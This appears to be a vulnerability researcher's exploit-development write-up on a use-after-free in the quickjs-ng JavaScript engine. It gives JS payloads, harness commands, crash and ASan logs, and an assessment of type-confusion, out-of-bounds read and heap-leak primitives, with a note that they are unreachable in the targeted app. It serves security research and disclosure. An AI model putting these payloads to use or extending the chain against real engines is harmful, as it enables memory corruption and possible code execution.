# From the `js_array_find` interrupt UAF to an arena type-confusion primitive

> **Archive note (2026-11-01 14:27, device-verified):** the app-model
> assumption below — eval #2 in the same context after the interrupt — does
> **not** hold in Telegram 13.2.0. `runScripts` breaks after `die()`, and the
> M1 device test confirmed that script 2 never executes. These primitives are
> therefore **not reachable through widget JS**; they remain lab evidence of
> the corruption class and matter only for the teardown-GC crash path.

Local quickjs-ng v0.17.0 (x86-64), arena enabled, ASan variant with the arena
forced on. No phone. App model: eval #1 is interrupted (uncatchable), the
context is **not** freed, eval #2 runs in the same context.

Artifacts: `arena_inst.c` (instrumented engine), `poc_arena.c` (harness),
`build_poc.sh`, logs `logs_poc_*.txt`.

## 1. Size classes of the freed `val`

Measured with `__info(v)` (`JS_DebugClassOf` reads `block_size_idx`):

| value | sizeof | block size (`align8(n)+8`) | class |
|---|---|---|---|
| 1-char JSString (string elements) | 40+1+1 = 42 | 56 | **56** |
| 31-char JSString | 40+31+1 = 72 | 80 | **80** |
| 47-char JSString | 88 | 96 | 96 |
| plain JSObject `{}` | 72 | 80 | **80** |
| JSVarRef (closure capture) | 48 | 56 | 56 |
| JSShape | 56 | 64 | 64 |

`sizeof(JSString) == 40` because `ENABLE_DUMPS` is unconditionally defined at
`quickjs.c:85`, so the string has a 16-byte leak-list `link` at offset 24 and
the character data starts at **offset 40**.

## 2. What the "double free" actually is

It is **not** a plain double push. At the loop-top poll `val` is the element
from the previous iteration. For an element held by the array, the refcount
went `array 1 + val 1 -> free val -> 1`; the stale free drops it to 0 and
frees the block *while the array still references it*. This is a
**premature free of a live, JS-referenced value** (an over-decrement by one).

The second `js_arena_free` then reads `b->u.block_idx`, which the first free
overwrote with `free_next` (the previous free-list head index `H`). It
computes a bogus `JSArena *` at `b - block_size*H - sizeof(JSArena)` and
writes `first_free_block`/`n_used_blocks` there. Observed for a class-80
object: `u=47`, first free normal, second free with H=47 -> bogus arena
write; the block is left with an inconsistent header (`block_idx=0xFFFF`,
`ref_count=0`). That is the state we exploit, not a clean free-list loop.

## 3. PoC A - object slot aliases a string (type confusion)

Payload (`poc_arena alias obj 20000`, `NUDGE=1` polls at the loop top):

```js
var A=[]; for (i=0;i<N;i++) A.push({i:i});
Array.prototype.find.call(A, cb);      // cb returns false
```

The stale free frees `A[4996]` (a JSObject, class 80) while the array still
points at it. Script 2 allocates a fresh **31-char string** (class 80) and it
lands on exactly that block:

```
[inst] POLL fire at k=4997 valtag=-1 valptr=0x55ccfca85b70
[A[idx] before] tag=-1 ptr=0x55ccfca85b70 cls=-1 rc=1
[alias] reclaimed=0x55ccfca85b70 cls=80 SAME=YES
[alias] A[4996].x        -> SIGSEGV
```

`A[4996]` is OBJECT-tagged but points to a `JSString`; `find_own_property()`
reads the string's leak-list pointer (offset 24) as `JSObject.shape` and
crashes. This is a controlled type confusion (an "object" over attacker-owned
string bytes), but the shape field is not attacker-controlled because the
string's header occupies offsets 0..39.

## 4. PoC B - string slot aliases an object (forged length -> OOB read)

Payload (`poc_arena leak arr31 20000`, `NUDGE=1`):

```js
var keep=null;
function cb(v,i){ keep=v; return false; }
var A=[]; for (i=0;i<N;i++) A.push('B'.repeat(31));   // class 80
Array.prototype.find.call(A, cb);
```

Script 2: set `keep=null` (this frees the string; the array slot `A[4996]`
still references it), then `new Object()` (class 80) reclaims the block:

```
[A[idx] dangling] tag=-7 ptr=0x556abe17a570 cls=80 rc=2
[leak] reclaimed=0x556abe17a570 cls=80 SAME=YES
[leak] forged A[idx].length = 1041104704      (= low31 of JSObject.link.next)
[leak] A[4996].charCodeAt(1000000)            -> SIGSEGV (or reads heap data)
```

`A[4996]` is STRING-tagged over a `JSObject`. `JSString.len` (offset 0) is
the low 31 bits of `JSObject.header.link.next`, i.e. **a heap pointer**, and
the string data pointer is `p+40` (the object's `first_weak_ref`/union).
Result: a forged length up to 2^31 and a read window `p+40 .. p+40+len`.

ASan proof with the arena forced on (`poc_arena_asan`, `PROBE_IDX=200`):

```
[leak] forged A[idx].length = 74096
==ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 1
    #0 string_get / arena_inst.c:2337
    #1 js_string_charCodeAt / arena_inst.c:47304
0x5210000ca4d0 is located 8 bytes after 4040-byte region
    [0x5210000c9500,0x5210000ca4c8)
```

The 4040-byte region is the 4 KB arena slab; the read crossed the slab
boundary because the forged length is huge. Non-ASan, the same read at
`charCodeAt(1000000)` segfaults (address `p+40+1000000`).

The forged `len` itself is an info leak: it is the low 32 bits of a GC list
pointer. Reading `p+48` (the object's union) leaks `u.array.values` for an
array, `u.object_data` for a String wrapper, `u.func.function_bytecode` for a
function, etc. - i.e. pointers to other heap objects.

## 5. PoC C - freeing the forged string (best effort)

`poc_arena double arr31 20000` frees the forged string (`A=null`) after the
block was reclaimed by a JSObject. Observed: the object's header becomes
`cls=-1, rc=0` (the block leaves the class free list / is treated as a large
block), but the next allocation (`O2={}`) did **not** reuse it, so no
double-allocation alias was obtained in this run. A clean double allocation
needs the forged string's `kind`/`atom_type` bits groomed (they come from the
object's GC link pointer) or a controlled header; that is future work.

## 6. App-model feasibility under the 6 MiB cap / 300-500 ms budget

* The demonstrated PoC B uses an array of 31-char strings: 80 B per element
  (object) + 16 B slot. The 6 MiB cap limits it to ~65 k elements. The find
  loop then lasts only ~20-35 ms at 2-4 k iterations/ms, so the interrupt
  would fire after the loop ended. **This exact payload does not reach a
  300-500 ms budget under the cap on a fast device.** A shared 31-char
  string (`fill`) allows ~390 k slots (16 B each) = ~100-200 ms, still short.
* The budget-compatible payload is the big string
  (`'A'.repeat(2e6)`, 2.1 MB): its elements are 1-char strings, **class 56**.
  The over-decrement/dangling-reference trick works the same way, but the
  reclaim target must also be class 56. `JSVarRef` is 48 B -> class 56, but
  repeated attempts to reclaim the freed 1-char block with closure var_refs
  failed: the block stayed on the free list (forged `len` read back as a
  small free-list index, `gc_obj_type=0`), i.e. we did not get a cross-type
  object in class 56. This is the main open problem for a full on-device
  chain.
* A `Proxy` returning a fresh 31-char string per index is memory-cheap and
  gives class-80 elements with a virtual length, but its get trap adds many
  polls per iteration; in 25 phase nudges the interrupt always fired inside
  the trap, never at the `js_array_find` loop top, so the stale free did not
  happen. Not usable as-is.

## 7. Arbitrary read/write / RCE assessment

* **Read**: yes, a practical heap OOB read. A forged JSString gives a 31-bit
  length and a data pointer `p+40` into a chosen (groomable) block, plus
  pointer leaks (`len` = GC link bits; `p+48` = union pointers). It is a
  forward-only, block-relative read, not yet an absolute arbitrary address
  read.
* **Write**: not demonstrated. The object-over-string direction crashes on
  the fake shape (the string's leak-list pointer). A write needs a controlled
  `JSShape`/`prop` pointer; the most promising route is to reclaim with a
  type whose fields at offsets 24/32 can be chosen (e.g. a JSVarRef whose
  link pointers can be groomed), then use a property store.
* **RCE**: not demonstrated. The primitives are real (type confusion, OOB
  read, heap leak) and quickjs has no JIT, so a chain would have to corrupt a
  `JSFunctionBytecode`, shape, or the atom table. Given a write primitive,
  that is plausible; with the current read-only primitive it is not.

## 8. Commands

```sh
cd /tmp/opencode
gcc -O1 -g -fno-omit-frame-pointer -I qjs017 poc_arena.c \
    arena_inst.o lr2.o lu2.o dt2.o -lm -lpthread -rdynamic -o poc_arena

NUDGE=1 ./poc_arena alias  obj   20000   # SAME=YES, SIGSEGV in find_own_property
NUDGE=1 ./poc_arena leak   arr31 20000   # forged len ~1e9, OOB read / SIGSEGV
NUDGE=1 PROBE_IDX=200 ASAN_OPTIONS=detect_leaks=0 ./poc_arena_asan \
        leak arr31 20000                 # ASan heap-buffer-overflow past the slab
NUDGE=1 ./poc_arena double arr31 20000   # block leaves the class list; no alias
```

`NUDGE=1` adds one JS call (one interrupt poll) so the handler fires at the
loop-top poll; without it the fire lands on the predicate-call poll and no
stale free happens. The same one-poll phase sensitivity applies on-device.
